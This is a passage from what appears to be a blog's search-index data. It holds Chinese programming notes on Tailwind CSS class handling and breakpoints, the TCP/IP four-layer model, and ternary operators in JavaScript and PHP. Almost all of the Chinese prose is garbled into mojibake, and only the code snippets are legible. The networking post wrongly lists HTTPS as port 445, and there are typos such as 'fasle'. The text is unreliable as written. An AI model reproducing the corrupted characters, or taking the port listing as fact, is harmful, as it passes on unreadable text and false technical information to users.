/&gt; ))} &lt;/div&gt; )} ç¸½ä¹‹é€™æ˜¯æ‹¿ä¾†è®“ä½ æ­é…æ¸²æŸ“ç”¨çš„ï¼Œè·ŸåŸæœ¬ CSS å¯«åœ¨çˆ¶å±¤çš„æ¦‚å¿µæœ‰é»ä¸åŒï¼Œè¦ç¿’æ…£ä¸€ä¸‹ã€‚ å‹•æ…‹ classç°¡å–®ä¾†èªªï¼Œå¦‚æœä½ è¦å‹•æ…‹ç”¢ç”Ÿ class çš„è©±ï¼š è«‹å‹™å¿…ç”¨å…¨åï¼Œä¸è¦ç”¨å­—ä¸²æ‹¼æ¥ è«‹å‹™å¿…ç”¨å…¨åï¼Œä¸è¦ç”¨å­—ä¸²æ‹¼æ¥ è«‹å‹™å¿…ç”¨å…¨åï¼Œä¸è¦ç”¨å­—ä¸²æ‹¼æ¥ è©³ç´°çš„åŸå› å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼Œä½†ç°¡å–®ä¾†èªªå°±æ˜¯é€éå­—ä¸²æ‹¼æ¥çš„ class æ²’è¾¦æ³•è¢«ç·¨è­¯å‡ºä¾†ï¼Œä¸‹é¢ä¾†èˆ‰å€‹ä¾‹å­ã€‚ ç•¶æ™‚æˆ‘æƒ³åšä¸€å€‹æŒ‰éˆ•å…ƒä»¶ï¼Œä¸¦æ ¹æ“š props çš„å…§å®¹ä¾†æ±ºå®šèƒŒæ™¯é¡è‰²ï¼Œæ‰€ä»¥å°±å¯«äº†é€™æ¨£çš„æ±è¥¿ï¼š 12345678910111213const Button = ({ color, onClick }) =&gt; { const palette = { purple: 'violet', green: 'green', red: 'red' } return ( &lt;button className={`w-5 h-5 rounded-full border-0 bg-${palette[color]}-700`} onClick={onClick} &gt;&lt;/button&gt; )} é€™è£¡çš„æƒ³æ³•å°±æ˜¯é€éå­—ä¸²æ‹¼æ¥ bg-{props}-700 ä¾†ç”¢å‡ºæƒ³è¦çš„ classï¼Œä½†æ˜¯å‡ºä¾†çš„çµæœä¸¦ä¸å¦‚é æœŸã€‚ å„˜ç®¡ class æœƒè¼¸å‡ºæ­£ç¢ºçš„å­—ä¸²ï¼Œä¾‹å¦‚ props: red -&gt; bg-red-700ï¼Œå¯æ˜¯é€™æ™‚å¾Œä¸¦ä¸æœƒé¡¯ç¤ºæ­£ç¢ºçš„èƒŒæ™¯é¡è‰²ï¼Œé€™å€‹å°±æ˜¯ç”¨å­—ä¸²æ‹¼æ¥æ™‚æœƒç”¢ç”Ÿçš„å•é¡Œã€‚ å¦‚æœæƒ³å‹•æ…‹ç”¢ç”Ÿ class çš„è©±ï¼Œå¿…é ˆç”¨å…¨åä¾†å¥—ç”¨ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314const Button = ({ color, onClick }) =&gt; { // å…¨å const palette = { purple: 'bg-violet-700', green: 'bg-green-700', red: 'bg-red-700' } return ( &lt;button className={`w-5 h-5 rounded-full border-0 ${palette[color]}`} onClick={onClick} &gt;&lt;/button&gt; )} å¤šè¡Œæ–‡å­—æ›è¡Œé›–ç„¶ç”¨æˆ‘ä¹‹å‰æœ‰å¯«ä¸€ç¯‡ CSS å¤šè¡Œæ–‡å­—é¡¯ç¤º â€¦ çš„æ•ˆæœï¼Œä½†è¦åœ¨ tailwind ä¸Šè‡ªå·±å¯¦ä½œçš„è©±æœ‰é»éº»ç…©ï¼Œæ‰€ä»¥å»ºè­°æ”¹ç”¨ä¸‹é¢çš„æ–¹å¼ã€‚ è©³ç´°å¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ èªªæ˜ï¼Œé€™é‚Šåªåˆ—æ–¹æ³•ã€‚ å®‰è£å¥—ä»¶ï¼š 1npm install @tailwindcss/line-clamp è¨­å®š configï¼š 1234567module.exports = { // ... plugins: [ // ... require('@tailwindcss/line-clamp') ]} åŠ ä¸Š classï¼š 123456789&lt;p class=\"line-clamp-3\"&gt; Here's a block of text from a blog post that isn't conveniently three lines long like you designed for originally. It's probably like 6 lines on mobile or even on desktop depending on how you have things laid out. Truly a big pain in the derriere, and not the sort of thing you expected to be wasting your time trying to deal with at 4:45pm on a Friday am I right? You've got tickets to SmackDown and you heard there's gonna be a dark match with that local guy from two towns over that your cousin went to high school with before the show starts, and you're gonna miss it if you're not there early.&lt;/p&gt; å¦‚æœä½ æŠŠ devtool æ‰“é–‹ä¾†çœ‹çš„è©±å°±æœƒç™¼ç¾å…¶å¯¦è·Ÿ CSS å¤šè¡Œæ–‡å­—é¡¯ç¤º â€¦ çš„æ•ˆæœ å¯«çš„å…§å®¹ä¸€æ¨£ï¼Œåªæ˜¯åŒ…è£æˆ utility è€Œå·²ã€‚ å›åˆ°ç†Ÿæ‚‰çš„ classï¼ˆ@applyï¼‰åœ¨ tailwind è£¡é¢å¦‚æœæƒ³è¦å¹«æ¯å€‹å…ƒç´ å¥—ç”¨åŒæ¨£çš„æ¨£å¼ï¼Œä½ å¯èƒ½å¾—é€™æ¨£å¯«ï¼š 123456789101112131415161718&lt;button class=\"py-2 px-4 bg-blue-500 text-white font-semibold rounded-lg shadow-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-75\"&gt; click1&lt;/button&gt;&lt;button class=\"py-2 px-4 bg-blue-500 text-white font-semibold rounded-lg shadow-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-75\"&gt; click2&lt;/button&gt;... ... åªæ˜¯å¥—ç”¨çš„è©±é€™æ¨£å¯«æ˜¯æ²’å·®ï¼Œé‡é»æ˜¯å¦‚æœè¦æ”¹å‘¢ï¼Ÿæˆ‘å€‘ä¾†çœ‹çœ‹ å®˜æ–¹æ–‡ä»¶ æ€éº¼åšçš„ï¼š å®˜ç¶²é‚„é †ä¾¿åæ§½äº†ä¸€ä¸‹ï¼š If you can quickly edit all of the duplicated class lists simultaneously, thereâ€™s no benefit to introducing any additional abstraction. ç¸½ä¹‹å¦‚æœä½ èƒ½æ¥å—çš„è©±å°±é€™æ¨£å­åšå°±å¥½ï¼Œä½†å¦‚æœçœŸçš„ä¸è¡Œå°±ç¹¼çºŒçœ‹ä¸‹å»å§ã€‚ tailwind æä¾›äº†ä¸€å€‹å«åš @apply çš„æ±è¥¿ï¼Œå¯ä»¥è®“ä½ æŠŠä¸€å¨ utilty åŒ…è£æˆä¸€å€‹ classï¼Œç”¨æ³•æ˜¯é•·é€™æ¨£ï¼š 12345678910111213141516/* index.css */@tailwind base;@tailwind components;@tailwind utilities;@layer components { .label { @apply text-slate-500 mb-2; } .label-dark { @apply text-white mb-2; } .input-field { @apply w-full border-0 text-slate-700 focus:outline-slate-700 p-2 rounded; }} é †é“ä¸€æï¼Œä½ ç”šè‡³èƒ½ç›´æ¥åœ¨è£¡é¢åŠ ä¸ŠåŸç”Ÿçš„ CSSï¼š 123456@layer components { .label { @apply text-slate-500 mb-2; background-color: dodgerblue; }} é›–ç„¶ä¸ç¢ºå®šé€™æ˜¯ä¸æ˜¯åˆæ³•çš„å¯«æ³•ï¼Œä¸éæˆ‘è¦ºå¾—é‚„è »æ–¹ä¾¿çš„å°±æ˜¯äº† XD ä¸€æ¬¡æ€§çš„å±¬æ€§å€¼é›–ç„¶é€é tailwind.config.js å¯ä»¥æ·»åŠ ä¸€äº›å®¢è£½åŒ–çš„é …ç›®ï¼Œä½†æ˜¯æœ‰æ™‚æœƒç¢°åˆ°é‚£ç¨®åªæœƒå‡ºç¾åœ¨ã€Œç‰¹å®šä¸€å…©å€‹åœ°æ–¹ã€çš„æ¨£å¼ï¼Œé€™æ™‚å€™ä½ é€šå¸¸å°±ä¸æœƒæƒ³æŠŠå®ƒåŠ é€² theme çš„è¨­å®šä¸­ï¼Œç•¢ç«Ÿç”¨åˆ°çš„å ´åˆçœŸçš„ä¸å¤šï¼Ÿ é€™æ™‚å€™å°±å¯ä»¥è€ƒæ…®ç”¨ xxx-[value] çš„æ–¹å¼ä¾†å¡«å…¥ã€Œä¸€æ¬¡æ€§ã€çš„å€¼ï¼Œåƒé€™æ¨£ï¼š 1&lt;div class=\"text- font-body bg-[#bada55] text-[24px] p-[20px]\"&gt;...&lt;/div&gt; åªè¦é€™æ¨£å­å°±å®Œæˆå›‰ï¼Œæ˜¯ä¸æ˜¯çœäº‹å¾ˆå¤šå•Šï¼ é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœæƒ³è¦å¸¶å…¥ã€Œè®Šæ•¸ã€ä¹Ÿæ˜¯ OK çš„ï¼Œä¸éä½¿ç”¨æ™‚è¦åŠ ä¸Šã€Œå±¬æ€§ã€ä¾†è¡¨æ˜é€™å€‹è®Šæ•¸æ˜¯ç”¨ä¾†ä»£è¡¨ä»€éº¼çš„ï¼Ÿä¾‹å¦‚ colorï¼ˆé¡è‰²ï¼‰ æˆ– lengthï¼ˆå°ºå¯¸ï¼‰ä¹‹é¡çš„ï¼Œè©³ç´°å¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ çš„èªªæ˜ï¼Œé€™é‚Šåšå€‹ç°¡å–®çš„ç¤ºç¯„ï¼š 12345678@tailwind base;@tailwind components;@tailwind utilities;:root { --primary: #f00099; --large: 24px;} 12345678910&lt;div&gt; &lt;!-- æŠŠè®Šæ•¸æ”¾åœ¨ [] è£¡é¢ä¸¦æŒ‡å®šç‚º color é€™å€‹å±¬æ€§ --&gt; &lt;button class=\"bg-[color:var(--primary)] text-white p-2 rounded\"&gt;Click Me&lt;/button&gt; &lt;!-- æŠŠè®Šæ•¸æ”¾åœ¨ [] è£¡é¢ä¸¦æŒ‡å®šç‚º length é€™å€‹å±¬æ€§ --&gt; &lt;p class=\"font-bold text-[length:var(--large)]\"&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Modi alias, hic voluptatem quo unde reiciendis magni accusamus quos illum corrupti veniam voluptatum voluptas voluptate harum necessitatibus dolorem cumque nulla saepe. &lt;/p&gt;&lt;/div&gt; ä¸»è¦å°±æ˜¯è¦è¨˜å¾—åŠ ä¸Šã€Œå±¬æ€§ã€å°±å¥½ï¼Œä¸ç„¶å…¶å¯¦å°±è·Ÿä¸€èˆ¬çš„ç”¨æ³•å·®ä¸å¤šã€‚ BreakPointï¼ˆæ–·é»ï¼‰åœ¨å¯« CSS æ™‚è¦åš RWD çš„è©±éƒ½æœƒç”¨ @media ä¾†å°ä¸åŒçš„æ–·é»è¨­å®šä¸åŒæ¨£å¼ï¼Œé€™å€‹åœ¨ Tailwind ä¸­ä¹Ÿæœ‰æä¾›å°æ‡‰çš„ utilityï¼š 123456789101112131415/** @type {import('tailwindcss').Config} */module.exports = { content: [], presets: [], darkMode: 'media', // or 'class' theme: { screens: { sm: '640px', md: '768px', lg: '1024px', xl: '1280px', '2xl': '1536px' } }} sm æœƒå°æ‡‰åˆ° @media (min-width: 640px)ï¼Œmd æœƒå°æ‡‰åˆ° @media (min-width: 768px) ä»¥æ­¤é¡æ¨ã€‚ è¦å¥—ç”¨çš„è©±åªè¦åŠ ä¸Šã€Œå‰ç¶´ã€å°±è¡Œäº†ï¼š 1&lt;div class=\"bg-red-500 sm:bg-green-500 md:bg-sky-500 lg:bg-pink-500 xl:bg-teal-500 \"&gt;&lt;/div&gt; ä¹Ÿæ˜¯å¾ˆæ–¹ä¾¿çš„åŠŸèƒ½ã€‚","link":"/2022/07/03/tailwind-basic/"},{"title":"å¿«é€Ÿé‡æº« TCP/IP å››å±¤æ¨¡å‹","text":"å¥½æ•…äº‹å€¼å¾—ä¸€çœ‹å†çœ‹ã€‚ ç°¡è¿°TCP/IP å››å±¤æ¨¡å‹æ˜¯å¾ã€ŒOSI ä¸ƒå±¤æ¨¡å‹ã€å»¶ä¼¸å‡ºä¾†çš„ä¸€å€‹æ¨¡å‹ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æŠŠä¸ƒå±¤ç²¾ç°¡æˆå››å±¤ï¼Œæœƒæ¯”è¼ƒæ²’é‚£éº¼è¤‡é›œã€‚ ç„¶å¾Œé€™ç¯‡ç­†è¨˜æƒ³è¨˜ä¸‹çš„äº‹æƒ…æ˜¯ï¼š çŸ¥é“ HTTP æ˜¯ä»€éº¼ï¼Ÿ çŸ¥é“ä»€éº¼æ˜¯ TCP / IP å››å±¤ï¼Ÿå››å±¤æ˜¯åŒ…å«å“ªäº›ï¼Ÿ çŸ¥é“æ¯å€‹æœå‹™å¯ä»¥éµå®ˆä¸åŒçš„å”è­°ï¼Ÿ çŸ¥é“ TCP / UDP çš„å·®ç•°ï¼Ÿ çŸ¥é“ä»€éº¼æ˜¯ portï¼Ÿ çŸ¥é“ç¶²è·¯åˆ†å±¤çš„æ¦‚å¿µï¼Ÿ çœ‹åœ–è¤‡ç¿’ æ‡‰ç”¨å±¤ç°¡å–®ä¾†èªªå°±æ˜¯ï¼šç”¨å‚³ç´™æ¢ä¾†åšä»€éº¼ï¼Ÿ å¯ä»¥æœ‰å¾ˆå¤šä¸åŒçš„æ‡‰ç”¨ï¼Œä¾‹å¦‚ã€Œè¨‚ä¾¿ç•¶ã€ã€ã€Œå€Ÿç±ƒçƒã€ã€ã€ŒNBA å³æ™‚æˆ°æ³ã€ç­‰ç­‰ï¼Œå¦‚æœå°æ‡‰åˆ°ç¶²è·¯çš„ä¸–ç•Œå°±æ˜¯ã€ŒHTTPã€ã€ã€ŒFTPã€ã€ã€ŒSMTPã€ç­‰ç­‰ã€‚ å‚™è¨»ï¼šæœå‹™è·Ÿå”è­°å¯èƒ½è »å¸¸ææ··çš„ï¼Œç°¡å–®ä¾†èªªä½ å¯ä»¥æƒ³æˆã€Œè¨‚ä¾¿ç•¶æœå‹™ã€æ¡ç”¨çš„æ˜¯ã€Œè¨‚ä¾¿ç•¶å”è­°ã€ï¼›ã€ŒHTTP æœå‹™ã€æ¡ç”¨çš„æ˜¯ã€ŒHTTP å”è­°ã€ï¼›ã€ŒFTP æœå‹™ã€æ¡ç”¨çš„æ˜¯ã€ŒFTP å”è­°ã€ã€‚æ¯å€‹æœå‹™éƒ½æœƒæœ‰æ¡ç”¨ä¸€å€‹å°æ‡‰çš„å”è­°ä¾†æ±ºå®šé›™æ–¹ä¹‹é–“çš„æºé€šæ–¹å¼ã€‚ é€™äº›æœå‹™å¯èƒ½éƒ½åŒ¯é›†åœ¨åŒä¸€å°ä¸»æ©Ÿä¸Šï¼Œè€Œç‚ºäº†è®“æ¯å€‹æœå‹™å„å¸å…¶è·ï¼Œæœƒç”¨ã€Œportã€ä¾†ä»£è¡¨æ¯å€‹æœå‹™çš„ç«¯å£ï¼ˆé€£æ¥åŸ ï¼‰ï¼Œä½ æƒ³è¦ç”¨å“ªå€‹æœå‹™ï¼Œå°±è¼¸å…¥å°æ‡‰çš„ç«¯å£è™Ÿç¢¼ï¼Œå¸¸è¦‹çš„ port ç‚ºï¼š HTTP 80ï¼ˆé è¨­ï¼‰ HTTPS 445 FTP 21 ä¾‹å¦‚æˆ‘æƒ³ç”¨ google ä¸»æ©Ÿä¸Šçš„ HTTP æœå‹™ï¼Œæˆ‘å¯ä»¥åœ¨ç¶²å€è¼¸å…¥ï¼š 1172.217.160.110:80 ä¸éå› ç‚ºé è¨­å°±æ˜¯æ¡ç”¨ 80 é€™å€‹ portï¼Œæ‰€ä»¥å…¶å¯¦å°±ç®—ä¸è¼¸å…¥ä¹Ÿæ²’é—œä¿‚ã€‚ å¦å¤–ï¼Œå› ç‚ºä¸åŒæœå‹™æ¡å–çš„å”è­°ä¸åŒï¼Œæ‰€ä»¥å…§å®¹æ ¼å¼ä¹Ÿæœƒä¸åŒï¼Œä¾‹å¦‚è¨‚ä¾¿ç•¶çš„æ ¼å¼æ¯”è¼ƒè¤‡é›œï¼Œä½†å€Ÿç±ƒçƒçš„æ ¼å¼å°±å¾ˆç°¡å–®ã€‚ è¨‚ä¾¿ç•¶ï¼ˆHTTPï¼‰çš„æ ¼å¼æ˜¯ï¼š æ¨™æº–åŒ–å…§å®¹æ ¼å¼ æŠŠå…§å®¹åˆ†æˆ header è·Ÿ body ç”¨ç‹€æ…‹ç¢¼æ¨™æº–åŒ–çµæœï¼ˆå›æ‡‰ï¼‰ ç”¨å‹•è©æ¨™æº–åŒ–å‹•ä½œï¼ˆè«‹æ±‚ï¼‰ åœ¨è¨‚ä¾¿ç•¶çš„ä¾‹å­è£¡æ˜¯ï¼š 12345POSTé€é”æ™‚é–“ï¼šç¬¬å››å ‚----------------é›è…¿é£¯ 5é›æ’é£¯ 2 å°æ‡‰åˆ°ç¶²è·¯çš„è©±æœƒæ˜¯ï¼š 12345POSThttps://reqres.in/api/users/1--------------------------------\"name\": \"PeaNu\"\"job\": \"F2E\" å‚³è¼¸å±¤ç°¡å–®ä¾†èªªå°±æ˜¯ï¼šç”¨ä»€éº¼æ–¹å¼å‚³éè³‡æ–™ï¼Ÿ æœ€å¸¸è¦‹çš„å…©å€‹å”è­°ï¼š TCP ä¿è­‰é›™æ–¹éƒ½èƒ½æ¥æ”¶è·Ÿå‚³éåˆ°è¨Šæ¯ï¼ˆå› ç‚ºæœ‰ä¸‰æ¬¡æ¡æ‰‹ï¼‰ UDP ä¸ä¿è­‰è¨Šæ¯èƒ½æ¥æ”¶ï¼Œä½†é€Ÿåº¦æ¯”è¼ƒå¿« ã€Œè¨‚ä¾¿ç•¶ã€é€™å€‹æ‡‰ç”¨å»ºç«‹åœ¨ã€Šç´™æ¢ä¿è­‰å‚³å¾—åˆ°é€šè¨Šå”å®šã€‹ï¼ˆæˆ–è€…èªªæ˜¯ TCPï¼‰ä¹‹ä¸Šï¼Œç›®çš„æ˜¯è®“è¨‚ä¾¿ç•¶çš„åŒå­¸ç¢ºå®šè‡ªå·±çš„è¨Šæ¯èƒ½è¢«æ¥æ”¶åˆ°ã€‚ä½†æ˜¯åƒã€ŒNBA å³æ™‚æˆ°æ³ã€å°±æ²’æœ‰å¿…è¦å»ºç«‹åœ¨ã€Šç´™æ¢ä¿è­‰å‚³å¾—åˆ°é€šè¨Šå”å®šã€‹ä¸Šï¼Œå› ç‚ºé‡è¦–çš„æ˜¯å³æ™‚æ€§ï¼Œå¦‚æœæ¯ä¸€æ¬¡éƒ½è¦ç¶“éä¸‰æ¬¡ç¢ºèªçš„è©±æœƒå¾ˆéº»ç…©ã€‚ ç¶²è·¯äº’é€£å±¤ç°¡å–®ä¾†èªªå°±æ˜¯ï¼šç”¨ä»€éº¼æ–¹å¼è¡¨ç¤ºå¯„ä»¶äººèˆ‡æ”¶ä»¶äººï¼Ÿ ä¹Ÿå°±æ˜¯æˆ‘å€‘å¸¸è½åˆ°çš„ã€ŒIPï¼ˆInternet Protocolï¼‰ã€ã€‚ä½†è¦æ³¨æ„ ã€ŒIPã€è·Ÿã€ŒIP åœ°å€ã€å…©å€‹æ˜¯ä¸ä¸€æ¨£çš„æ„æ€ï¼Œå‰è€…æŒ‡çš„æ˜¯å”è­°æœ¬èº«ï¼Œå¾Œè€…æŒ‡çš„æ˜¯é€™å€‹å”è­°ä¸‹è¦ç¯„çš„ä¸€å€‹æ±è¥¿ï¼ˆä¹Ÿå°±æ˜¯åœ°å€ï¼‰ã€‚æ‰€ä»¥æˆ‘å€‘å£èªå¸¸èªªçš„ã€ŒIPã€ï¼Œæ­£ç¢ºä¾†èªªæ‡‰è©²æ˜¯ã€ŒIP å”è­°ä¸‹è¦ç¯„çš„é‚£å€‹ IP åœ°å€ã€ã€‚ è·Ÿ IP ç›¸é—œçš„å”è­°æœ‰ï¼š IPv6 IPv4 IPv6 çš„ IP åœ°å€ï¼š2001:b011:c005:5d0a:453:4df:cccb:e8dfIPv4 çš„ IP åœ°å€ï¼š192.168.1.104 ä¸»è¦å°±æ˜¯ç‰ˆæœ¬çš„å·®ç•°ï¼Œå‰è€…æ–°å¾Œè€…èˆŠï¼Œç„¶å¾Œ IPv4 æœ€å¤§çš„å•é¡Œå°±æ˜¯èƒ½å„²å­˜çš„æ•¸å­—æ¯”è¼ƒçŸ­ï¼Œæ‰€ä»¥æœƒç¢°åˆ° IP ä¸å¤ å¤§å®¶ç”¨çš„å•é¡Œï¼Œæ‰€ä»¥æ‰æœ‰äº† IPv6 ä¾†è§£æ±ºé€™å€‹å•é¡Œã€‚ ç¶²è·¯å­˜å–å±¤ç°¡å–®ä¾†èªªå°±æ˜¯ï¼šå¯¦éš›ä¸Šè¦æ€éº¼åšåˆ°å‚³ç´™æ¢é€™ä»¶äº‹ï¼Ÿ ä»¥å¯¦éš›ä¸Šä¾†èªªï¼š æµ·åº•é›»çºœ è·¯ç”± å…¶å¯¦å°±æ˜¯å¯¦éš›ç‰©ç†ä¸Šçš„æ±è¥¿ï¼Œè¦å‚³é€ç´™æ¢ä¸€å®šå¾—é€éã€ŒåŒå­¸ã€æˆ–æ˜¯ã€Œéƒµå·®ã€ä¾†åšåˆ°å‚³ç´™æ¢é€™ä»¶äº‹ã€‚å°æ‡‰åˆ°ç¶²è·¯ä¹Ÿä¸€æ¨£ï¼Œè¦å‚³é€è³‡è¨Šä¸€å®šå¾—é€éã€Œæµ·åº•é›»çºœã€æˆ–æ˜¯ã€Œè·¯ç”±ã€ä¾†åšåˆ°å‚³éè¨Šè™Ÿè·Ÿè³‡æ–™é€™ä»¶äº‹ã€‚ç•¢ç«Ÿä¸å¯èƒ½æœƒæœ‰ç”¨å¿µåŠ›æŠŠæ±è¥¿å¾ A å‚³åˆ° B é€™ç¨®ä¸ç§‘å­¸çš„äº‹æƒ…ç™¼ç”Ÿã€‚ åˆ†å±¤çš„æ¦‚å¿µæœ€å¾Œåªæ˜¯æƒ³æé†’ä¸€ä¸‹ï¼Œä¹‹æ‰€ä»¥æœƒç”¨ã€Œå±¤ã€ä¾†è§£é‡‹é€™äº›æ±è¥¿ï¼Œæ˜¯å› ç‚ºæ¯ä¸€å±¤ä¹‹é–“éƒ½æœ‰ç›¸å°æ‡‰çš„é—œä¿‚ã€‚ä¾‹å¦‚èªªã€Œè¨‚ä¾¿ç•¶ã€é€™å€‹æœå‹™æ˜¯åŸºæ–¼ã€Šç´™æ¢ä¿è­‰å‚³å¾—åˆ°é€šè¨Šå”å®šã€‹è·Ÿã€Šä½ æ˜¯èª°/è¦å‚³çµ¦èª°å”å®šã€‹ä¹‹ä¸Šã€‚ æ‰€ä»¥è¦åšæºé€šé€™ä»¶äº‹ï¼Œä¸€å®šæœƒç¶“éï¼šæ‡‰ç”¨å±¤ =&gt; å‚³è¼¸å±¤ =&gt; ç¶²è·¯äº’é€£å±¤ = &gt;ç¶²è·¯å­˜å–å±¤ é€™å¹¾å€‹ä¸åŒçš„å±¤ï¼Œä¸å¯èƒ½æœƒæœ‰å°‘æ‰å“ªä¸€å±¤çš„æƒ…æ³ã€‚ ä½†åŒæ™‚ä¹Ÿè¦çŸ¥é“ï¼Œæ¯ä¸€å±¤ä¹‹é–“å…¶å¯¦å¯ä»¥æ¡å–ä¸åŒçš„å”è­°ï¼Œåƒæ˜¯ã€Œè¨‚ä¾¿ç•¶ã€æ¡å–ã€Šç´™æ¢ä¿è­‰å‚³å¾—åˆ°é€šè¨Šå”å®šã€‹é€™å€‹å”è­°ä¾†ä½œç‚ºå‚³è¼¸æ–¹å¼ï¼Œä½†ã€ŒNBA å³æ™‚æˆ°æ³ã€å°±ä¸æ¡å–ã€‚å…¶å¯¦å°±çœ‹ä½ çš„éœ€æ±‚æ˜¯ä»€éº¼ï¼Œä¸¦æ²’æœ‰å“ªå€‹æœå‹™ä¸€å®šè¦ç”¨å“ªä¸€å€‹å”è­°æ‰æ˜¯æœ€æ­£ç¢ºçš„ã€‚ä½ ç”šè‡³å¯ä»¥è‡ªå·±å‰µé€ ä¸€å€‹æ–°çš„å”è­°ã€‚","link":"/2022/01/04/tcp-ip-model/"},{"title":"å¾ PHP åŸ¹é¤Šä½¿ç”¨ä¸‰å…ƒé‹ç®—å­çš„å¥½ç¿’æ…£","text":"é‚„è »ç¥å¥‡çš„ã€‚ ç°¡è¿°åœ¨ JavaScript è£¡é¢å¯ä»¥é€™æ¨£å¯«ï¼š 12let isTrue = true;isTrue ? console.log('yes') : console.log('no'); ä½†å¦‚æœä½ ç”¨åŒæ¨£çš„é‚è¼¯åœ¨ PHP é€™æ¨£å¯«ï¼š 12$isTrue = true;$isTrue ? echo 'yes' : echo 'no'; PHP æœƒç›´æ¥å™´ Parse Errorã€‚ æ¯”è¼ƒå¥½çš„åšæ³•ç¸½ä¹‹å‘¢ï¼Œç›¡é‡ä¸è¦åœ¨ä¸‰å…ƒé‹ç®—å­è£¡é¢å» call åˆ¥çš„ functionï¼Œæœ€å¥½æ˜¯å–®ç´”ã€Œçµ¦å€¼ã€å°±å¥½ã€‚ï¼ˆé›–ç„¶åœ¨ PHP çš„ç¯„ä¾‹åªæœ‰ echo ä¸èƒ½é€™æ¨£å¯«ï¼Œä½†å»ºè­°é¤Šæˆé€™å€‹ç¿’æ…£æ¯”è¼ƒå¥½ã€‚ï¼‰ åƒå‰›å‰›çš„ JavaScript æ‡‰è©²æ”¹æˆé€™æ¨£ï¼š 12let isTrue = true;console.log(isTrue ? 'yes' : 'fasle'); PHP ä¹Ÿä¸€æ¨£ï¼š 12$isTrue = true;echo $isTrue ? 'yes' : 'no'; é€™æ¨£å°±ä¸æœƒå™´ error äº†ã€‚","link":"/2022/02/16/ternary-operator-funny-thing/"},{"title":"ä¸‰å…ƒé‹ç®—å­","text":"å°±â€¦å¦‚é¡Œå•¦ã€‚ ä¸€åˆ‡éƒ½æ˜¯å› ç‚ºå¤ªæ‡¶ ç‚ºä»€éº¼é€™æ¨£èªªï¼Ÿå› ç‚ºä»¥å¾€åœ¨å®šç¾©ä¸€å€‹è®Šæ•¸çš„ã€Œå¸ƒæ—å€¼ã€çš„æ™‚å€™æˆ‘æœƒé€™æ¨£å¯«ï¼š 12var score = 60var isPass = (score &gt;= 60) isPass å°±æœƒå„²å­˜ true æˆ– fasleã€‚ å¯æ˜¯å¦‚æœæˆ‘æƒ³å„²å­˜çš„æ˜¯ 'Pass' æˆ– 'Fail' å°±æ²’è¾¦æ³•é€™æ¨£å¯«äº†ã€‚ æ‡¶å°±è¦æ‡¶åˆ°æ¥µè‡´ã€‚ æ–¼æ˜¯ä¸‰å…ƒé‹ç®—å­ç™»å ´äº†ï¼š 12var score = 60var message = score &gt;= 60 ? 'Pass' : 'Fail' ä»¥ä¸Šç´”å±¬æˆ‘å”¬çˆ›ï¼Œå®ƒæ‡‰è©²é‚„æ˜¯æœ‰ä¸€äº›åˆ¥çš„æ„ç¾©çš„ï¼Œä½†æˆ‘è¦ºå¾—ç”¨é€™ç¨®æ–¹å¼ä¾†ç†è§£ä¹Ÿè »èªªå¾—é€šçš„ã€‚ å¯ä»¥å·¢ï¼Œä½†å…ˆä¸è¦å®ƒç¢ºå¯¦å¯ä»¥å·¢ç‹€ï¼Œä½†è‰¯å¿ƒå»ºè­°é‚„æ˜¯ç”¨åœ¨ã€Œä¸æ˜¯ A å°±æ˜¯ Bã€çš„é€™ç¨®æƒ…æ³å°±å¥½ï¼Œä¸ç„¶ä½ å¯èƒ½æœƒæƒ³ææ­»ç•¶åˆå¯«é€™ä»½ code çš„å‚¢ä¼™ï¼š 123var score = 100var message = score &gt;= 60 ? (score === 100 ? 'Perfect' : 'Pass') : 'Fail'console.log(message) // Perfect å¥½ if ï¼Œä¸ç”¨å—ï¼Ÿ 12345678910var score = 100var message if (score === 100) { message = 'Perfect'} else if (score &gt;= 60) { message = 'Pass'} else { message = 'Fail'}console.log(message) // Perfect","link":"/2021/12/17/ternary-operator/"},{"title":"æ¸…é™¤é›œè¨Šçš„é‡è¦æ€§","text":"åœ¨æˆ‘å¤¢åˆ°äº†ä¸€å †æ°´è±šå›å¾Œé ˜åŸŸåˆ°çš„äº‹æƒ…ã€‚ é—œæ–¼é›œè¨Šæˆ‘å€‘åœ¨ç†è§£ä¸€å€‹è³‡è¨Šçš„æ™‚å€™ï¼Œå¾ˆå¤šæ™‚å€™æœƒè¢«å„ç¨®é›œè¨Šçµ¦å¹²æ“¾ï¼Œå°è‡´æ²’æœ‰è¾¦æ³•å¾—åˆ°çœŸæ­£æƒ³çŸ¥é“çš„è³‡è¨Šã€‚åˆæˆ–è€…æ˜¯å­¸ç¿’çš„æ™‚å€™ï¼Œå¸¸å¸¸æœƒè¢«ä¸€é•·ä¸²çš„å…§å®¹çµ¦æ··æ·†ï¼Œå°è‡´è‡ªå·±æ²’æœ‰å¼„æ‡‚ä½œè€…æƒ³è¡¨é”çš„æ˜¯ä»€éº¼ï¼Œæˆ–æ˜¯ä¸€æ®µæ•˜è¿°æƒ³è¡¨é”çš„æ˜¯ä»€éº¼ï¼›ä¸€æ®µç¨‹å¼ç¢¼åœ¨åšä»€éº¼ï¼Ÿ æ˜¨å¤©åœ¨å¯« å¯¦ä½œæ¨¡çµ„æ©Ÿåˆ¶ çš„æ™‚å€™ï¼Œæˆ‘é«”æœƒåˆ°äº†ã€Œé›œè¨Šã€å¸¶ä¾†çš„å½±éŸ¿ï¼šä½ ä¸çŸ¥é“å•é¡Œå‡ºåœ¨å“ªè£¡ï¼Œç‚ºä»€éº¼ç„¡æ³•ç†è§£ä¸€æ®µå…§å®¹ï¼Ÿ åœ¨æˆ‘å¯«å®Œé‚£ç¯‡æ–‡ç« å¾Œï¼Œæˆ‘é«”æœƒåˆ°ä¸€ä»¶äº‹æƒ…ã€‚ æˆ‘å€‘ä¹‹æ‰€ä»¥æœƒçœ‹ä¸æ‡‚åˆ¥äººçš„æ–‡ç« ï¼Œæ˜¯å› ç‚ºé›œè¨Šå¤ªå¤šäº†ã€‚ 